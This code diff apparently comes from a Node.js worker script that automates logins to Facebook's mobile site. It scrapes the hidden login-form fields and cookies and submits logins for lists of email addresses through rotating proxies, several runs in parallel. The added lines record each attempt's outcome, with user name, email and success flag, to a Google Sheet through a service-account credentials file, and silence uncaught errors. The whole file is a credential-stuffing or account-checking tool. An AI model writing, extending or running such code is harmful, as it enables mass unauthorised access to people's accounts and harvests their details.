@@ -44,52 +44,47 @@ function buildCookie(cookie) {
 }
 
 async function getLoginPage(request, userAgent) {
-    try {
-        let result = {};
-        const option = {
-            method: 'GET',
-            url: 'https://m.facebook.com/login',
-            timeout: 2000,
-            headers: {
-                'Host': 'm.facebook.com',
-                'User-Agent': userAgent
-            },
-            resolveWithFullResponse: true
-            // proxy
-        }
-        await request(option)
-            .then((response) => {
-                const document = new JSDOM(response.body).window.document;
-                while (!document) {
-                    setTimeout(() => { }, 1000);
-                }
-                const actionForm = document.getElementById('login_form').action;
-                const paramList = document.querySelectorAll('#login_form > input[type="hidden"]');
-                if (paramList && paramList.length !== 0) {
-                    result['formData'] = {};
-                    for (const iterator of paramList) {
-                        if (!iterator.id) {
-                            result['formData'][iterator.name] = iterator.value;
-                        }
-                    }
-                    let login = document.querySelector('#login_form button[type="submit"]');
-                    if (login) {
-                        result['formData'][login.name] = login.value;
+    let result = {};
+    const option = {
+        method: 'GET',
+        url: 'https://m.facebook.com/login',
+        timeout: 2000,
+        headers: {
+            'Host': 'm.facebook.com',
+            'User-Agent': userAgent
+        },
+        resolveWithFullResponse: true
+        // proxy
+    }
+    await request(option)
+        .then((response) => {
+            const document = new JSDOM(response.body).window.document;
+            while (!document) {
+                setTimeout(() => { }, 1000);
+            }
+            const actionForm = document.getElementById('login_form').action;
+            const paramList = document.querySelectorAll('#login_form > input[type="hidden"]');
+            if (paramList && paramList.length !== 0) {
+                result['formData'] = {};
+                for (const iterator of paramList) {
+                    if (!iterator.id) {
+                        result['formData'][iterator.name] = iterator.value;
                     }
                 }
-                result['url'] = 'https://m.facebook.com' + actionForm;
-                if (response.headers['set-cookie']) {
-                    result['cookie'] = buildCookie(response.headers['set-cookie']);
+                let login = document.querySelector('#login_form button[type="submit"]');
+                if (login) {
+                    result['formData'][login.name] = login.value;
                 }
-            }).catch(e => {
-                result = e.name;
-            });
+            }
+            result['url'] = 'https://m.facebook.com' + actionForm;
+            if (response.headers['set-cookie']) {
+                result['cookie'] = buildCookie(response.headers['set-cookie']);
+            }
+        }).catch(e => {
+            return { success: false, code: e.name };
+        });
 
-        return result;
-    }
-    catch (e) {
-        return null;
-    }
+    return result;
 }
 
 async function postLogin(request, resultGetLoginPage, userAgent, email) {
@@ -413,6 +408,11 @@ async function run() {
             // indexResult++;
             // console.log(indexResult, result);
             console.log(result);
+            if (result.info.code !== 'RequestError') {
+                await sheet.addRows(
+                    [{ name: result.info.nameUser ? result.info.nameUser : '', email: mail, success: result.info.success, code: result.info.code }]
+                );
+            }
         }
     } catch (e) { }
     finally {
@@ -433,15 +433,22 @@ async function run() {
 //         run();
 //     }
 // }
-// process.on('uncaughtException', function (err) {
-//     console.log("somethingError...");
-// });
 // main();
+
+process.on('uncaughtException', function (err) {
+    console.log("somethingError...");
+});
+
+const { GoogleSpreadsheet } = require('google-spreadsheet');
+const doc = new GoogleSpreadsheet('1aoPxJeI6K8wcFd8DploqoICNU3LIdtnTUiJ51xMZkMY');
+let sheet;
 const { parentPort, workerData } = require("worker_threads");
-parentPort.on("message", (param) => {
+parentPort.on("message", async (param) => {
+    await doc.useServiceAccountAuth(require('./creds-from-google.json'));
+    await doc.loadInfo(); // loads document properties and worksheets
+    sheet = doc.sheetsByIndex[0];
     listProxy = param.listProxy;
     proxyIndex = param.proxyIndex;
-    run();
     run();
     run();
     run();
